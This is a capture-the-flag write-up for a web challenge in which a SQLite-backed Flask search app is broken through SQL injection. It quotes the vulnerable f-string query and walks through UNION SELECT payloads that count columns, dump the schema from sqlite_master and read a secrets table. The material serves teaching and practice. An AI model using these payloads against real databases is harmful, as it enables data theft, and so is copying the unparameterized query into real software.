# Web: X-Marks-The-Flag

**Author**: [redtrib3](https://github.com/redtrib3)
**Points**: 250
**Hint(s)**: None
**Flag**: `xploit{uni0nize_th3_tabl3s_0verthrow_th3_sys4dm1ns}`

**Challenge description:**
```
We built a brand new exploit search engine, so you don’t have to waste time searching ExploitDB.

Note: No automated tools are required to solve this challenge.

Challenge Link:
http://xploitctf.live:64298/
```

## Solve

We are given a search engine type of application named 'Xpl0it Search', on searching anything such as a letter 'a', it returns every exploits with 'a' in its title.
we can also change the search parameter to - 'Title', 'Id', 'Date', 'Author', 'Type', 'Platform'.

If you notice the scroller on top of the webpage, there is a text which says " 👆 Visit /source for our source code", where /source is a hyperlink that gives us the actual source code of the website.
Read through the source code to understand how the flask application works, the vulnerability lies in one of the database utils 
that is made to query the database using two parameters 'keyword' and 'by'. These parameters are user inputs directly taken from `by` and `x` parameters in `/search`.
The user input is directly put into the sql query, obviously resulting in an SQL INJECTION vulnerability.

**Vulnerable code:**
```python3
        if by == 'title':
            query = f"SELECT * FROM exploits WHERE title LIKE '%{keyword}%'" # keyword is 'x' parameter
```

Step by step exploitation:
1. Find the number of columns reflected using the following injection query:
    `%' union select 1,2,3,4,5,6 -- -`
2. The above query is successful, since 6 columns are returned, we can use any one column to exfilterate data.
3. From the source code we know that the database is sqlite, so here is the payload to list table schemas.
`%' union select 1,2,3,4,5,sql from sqlite_master -- -`

Output:
```
CREATE TABLE company_secrets ( id INTEGER NOT NULL, secret VARCHAR NOT NULL, PRIMARY KEY (id) )
CREATE TABLE exploits ( id INTEGER NOT NULL, title VARCHAR NOT NULL, date DATE NOT NULL, author VARCHAR NOT NULL, type VARCHAR NOT NULL, platform VARCHAR NOT NULL, PRIMARY KEY (id) )
```
4. The company_secrets table is interesting, we can easily print the secret now:
`%' union select 1,2,3,4,5,secret from company_secrets`

5. We get the flag!
